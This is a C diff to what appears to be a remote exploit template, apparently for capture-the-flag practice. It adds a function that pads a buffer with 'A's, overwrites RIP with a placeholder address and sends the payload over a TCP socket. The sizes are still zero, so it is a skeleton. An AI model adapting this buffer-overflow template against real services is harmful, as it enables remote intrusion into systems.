@@ -22,6 +22,7 @@
 
 #include <error.h>
 #include <cpwn/tcpconnect.h>
+#include <cpwn/recvuntil.h>
 
 // Name of the program if argv[0] fails
 #define NAME "template"
@@ -55,8 +56,6 @@ void usage(char *name, FILE *f)
 
 struct args_t parse_args(int32_t argc, char **argv, int32_t min_args)
 {
-	set_errno(ESUCCESS);
-
 	struct args_t args;
 	memset(&args, 0, sizeof(struct args_t));
 
@@ -102,10 +101,45 @@ struct args_t parse_args(int32_t argc, char **argv, int32_t min_args)
 	return args;
 }
 
+void send_payload(int sock, void *payload, uint64_t payload_len)
+{
+	if (sock > -1 && payload && payload_len)
+	{
+		// Overflow to RIP
+		uint64_t overflow = 0;
+
+		// Size of the buffer on the other end
+		uint64_t full_payload_len = 0;
+
+		uint8_t *full_payload = malloc(full_payload_len);
+
+		if (full_payload)
+		{
+			// Fill the buffer with A's
+			memset(full_payload, 0x41, full_payload_len);
+
+			// Don't overflow ourselves
+			if (payload_len > (full_payload_len - overflow))
+				payload_len = (full_payload_len - overflow);
+
+			// Apply the payload
+			memcpy(&full_payload[overflow], payload, payload_len);
+
+			// Send it
+			write(sock, full_payload, full_payload_len);
+
+			// Remove the garbage that may or may not result from sending the payload
+			recvuntil(sock, "i got rekt> ", 12);
+
+			free(full_payload);
+		}
+	}
+	else
+		set_errno(EINVAL);
+}
+
 void exploit(char *host, char *port)
 {
-	set_errno(ESUCCESS);
-
 	if (host && port)
 	{
 		int sock = tcpconnect(host, port);
@@ -113,6 +147,11 @@ void exploit(char *host, char *port)
 		if (sock)
 		{
 			// Do the exploit :3
+			uint64_t payload[10];
+			memset(payload, 0, sizeof(payload));
+			payload[0] = 0xDEADBEEFCAFEBABE;		// RIP
+
+			send_payload(sock, payload, sizeof(payload));
 
 			// Print whatever comes over the socket until it closes
 			char c = 0;
